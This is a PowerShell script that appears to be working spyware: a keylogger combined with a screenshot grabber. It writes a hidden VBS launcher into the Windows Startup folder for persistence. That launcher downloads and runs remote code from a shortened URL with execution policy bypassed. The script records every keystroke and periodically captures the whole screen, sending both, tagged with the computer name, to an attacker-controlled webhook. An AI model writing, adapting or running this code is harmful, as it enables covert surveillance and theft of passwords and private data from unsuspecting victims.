if ($dc.Ln -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $dc = (irm $dc).url
}

$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
$mkFile = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
$mkFile | Out-File -FilePath $pth -Force
$mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://t.ly/o4SrC | iex`", 0, True"
$mkFile | Out-File -FilePath $pth -Append -Force
Rename-Item -Path $pth -NewName "init.vbs" -Force

$send = ""  # Inicialización de la variable $send
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru

# Import DLL Definitions for keyboard inputs
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Add stopwatch for intelligent sending
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

$seconds = 30 # Screenshot interval
$a = 1 # Screenshot amount

While ($true) {
    $keyPressed = $false

    try {
        # Start a loop that checks the time since the last activity before a message is sent
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            # Start the loop with a 30 ms delay between keystate checks
            Start-Sleep -Milliseconds 30

            # Capture key presses
            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) { $LString = "[BKSP]" }
                        if ($asc -eq 13) { $LString = "[ENT]" }
                        if ($asc -eq 27) { $LString = "[ESC]" }
                        $send += $LString
                    }
                }
            }
        }
    }
    finally {
        If ($keyPressed) {
            # Send the saved keys to a webhook
            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
            $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys

            # Remove the log file and reset the inactivity check
            $send = ""
            $keyPressed = $false
        }

        # Capture and send screenshot
        $Filett = "$env:temp\SC.png"
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width
        $Height = $Screen.Height
        $Left = $Screen.Left
        $Top = $Screen.Top
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)

        Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
        Remove-Item -Path $Filett
    }

    # Reset the stopwatch before restarting the loop
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
